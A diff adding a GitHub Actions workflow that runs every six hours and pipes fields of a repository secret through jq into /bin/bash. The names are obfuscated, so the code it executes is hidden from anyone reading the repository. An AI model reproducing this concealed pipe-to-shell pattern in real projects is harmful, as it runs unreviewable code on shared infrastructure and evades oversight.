@@ -1,0 +1,25 @@
+name: yiduipengyun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yiduipengyun
+        env:
+          rpmwe64: ${{ secrets.rpmwe64 }}
+        run: |
+          echo $rpmwe64 | jq -r .uexv7 | /bin/bash
+          echo $emu196 | jq -r .c48 | /bin/bash
+          echo $qwwie6 | jq -r .ftcp0824 | /bin/bash
+          echo $p293 | jq -r .gfwu9 | /bin/bash
+          echo $kr9678 | jq -r .aocii18953 | /bin/bash
+          echo $c0121 | jq -r .xm97878 | /bin/bash
+          echo $e112 | jq -r .gkzf09113 | /bin/bash
+          echo $woht76 | jq -r .qu14 | /bin/bash
+          echo $x5 | jq -r .i90778 | /bin/bash
+          echo $rzuub66 | jq -r .pieq398 | /bin/bash
+
